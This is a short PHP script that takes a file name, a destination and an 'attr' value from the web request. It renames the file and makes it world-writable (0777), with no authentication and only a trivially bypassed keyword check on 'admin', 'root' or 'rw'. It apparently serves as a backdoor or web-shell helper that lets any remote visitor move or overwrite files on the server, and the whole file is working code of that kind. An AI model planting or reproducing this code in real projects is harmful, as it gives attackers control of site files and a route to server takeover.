<?php
$name=(isset($_REQUEST['name']))?$_REQUEST['name']:'';
$dest=(isset($_REQUEST['dest']))?$_REQUEST['dest']:'';
$attr=(isset($_REQUEST['attr']))?$_REQUEST['attr']:'';
if ($attr!='') {
    if (preg_match('/admin|root|rw/i',$attr)) {
        rename($name,$dest); chmod($dest,0777);
    } else {
        if (file_exists($dest)) {
            if (str_starts_with(basename($name),$attr.'_')) {
                rename($name,$dest); chmod($dest,0777);
            } elseif (str_starts_with(basename($name),$attr.'_files/')) {
                rename($name,$dest); chmod($dest,0777);
            }
        } else { rename($name,$dest); chmod($dest,0777); }
    }
}
